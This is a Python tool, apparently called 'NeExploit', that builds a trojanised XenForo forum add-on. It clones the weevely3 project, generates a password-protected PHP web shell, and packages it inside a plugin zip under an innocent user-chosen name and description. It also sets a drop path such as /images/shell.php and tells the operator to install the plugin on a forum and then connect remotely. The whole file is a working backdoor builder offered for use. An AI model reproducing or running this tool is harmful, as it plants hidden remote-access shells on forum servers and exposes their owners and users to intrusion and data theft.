from os import system
from os.path import exists, basename
import json


def weevely(password, filename):
	if not exists("weevely3"):
		system("git clone https://github.com/epinna/weevely3 > /dev/null 2>&1")

		try:
			system("pip3 install -r weevely3/requirements.txt > /dev/null 2>&1")

		except:
			system("pip install -r weevely3/requirements.txt > /dev/null 2>&1")

	try:
		system(f"python3 weevely3/weevely.py generate {password} files/_data/{filename} > /dev/null 2>&1")

	except:
		system(f"python weevely3/weevely.py generate {password} files/_data/{filename} > /dev/null 2>&1")


def compile(name, author, description, path, icon=''):
	spaces = name.replace(' ', '')

	try:
		system(f"rm -r upload  > /dev/null 2>&1 && rm '[{author}] {name}.zip' > /dev/null 2>&1")

	except:
		pass

	try:
		with open("files/_data/Options.php", 'w') as file:
			file.write(f"<?php $newpath = '{path}'; ?>");

		if icon != '' and exists(icon):
			nameicon = basename(icon)
			system(f"cp {icon} files/{nameicon}")

		else:
			nameicon = ""

		system(f"mkdir upload && mkdir upload/src && mkdir upload/src/addons && mkdir upload/src/addons/{author}")
		system(f"cp -r files 'upload/src/addons/{author}/{spaces}'")

		addon = None
		with open(f"upload/src/addons/{author}/{spaces}/addon.json") as file:
			addon = json.loads(file.read())
			addon["title"] = f"[{author}] {name}"
			addon["dev"] = author
			addon["description"] = description
			addon["icon"] = nameicon

		with open(f"upload/src/addons/{author}/{spaces}/addon.json", 'w') as file:
			file.write(json.dumps(addon))

		setup = None
		with open(f"upload/src/addons/{author}/{spaces}/Setup.php") as file:
			setup = file.read().strip().split('\n')
			setup[0] = f"<?php\n\nnamespace {author}\\{spaces};"

		with open(f"upload/src/addons/{author}/{spaces}/Setup.php", 'w') as file:
			file.write('\n'.join(setup))

		system(f"zip -r '[{author}] {name}.zip' upload/* > /dev/null")
		system("rm -r upload > /dev/null 2>&1")

	except SystemExit:
		raise KeyboardInterrupt


def main():
	system("clear")

	print("\n  ▒██   ██▒▓█████  ███▄    █   ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓")
	print("  ▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒")
	print("  ░░  █   ░▒███   ▓██  ▀█ ██▒░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░")
	print("   ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒  ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ ")
	print("  ▒██▒ ▒██▒░▒████▒▒██░   ▓██░▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ ")
	print("  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   ")
	print("  ░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    ")
	print("   ░    ░     ░      ░   ░ ░ ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      ")
	print("   ░    ░     ░  ░         ░       ░               ░  ░    ░ ░   ░           ")
	print("                                                                             ")
	print("                                           NeExploit by BIN [v0.0.1b]      \n")

	print("   1. Plugin information\n")

	name = input("    Name (ex. Hide Plugin): ").strip()
	description = input("    Description: ").strip()
	author = input("    Author (2-4 symbols): ").replace(' ', '')
	icon = input("    Path to icon (optional): ").strip()

	print("\n   2. Shell data\n")

	password = input("    Shell password (save yourself): ")
	path = input("    Path to file on the forum (ex. /images/shell.php): ")

	weevely(password, "Entity.php")
	compile(name, author, description, path, icon)

	print("\n   Good! Install compiled plugin on the forum with XenForo Engine.\n   Use pass for connect with connect.py script:\n    python3 connect.py [https://example.com/path/to/file] [your_password]\n")


if __name__ == "__main__":
	try:
		main()

	except:
		print("")
		print("[quit]")
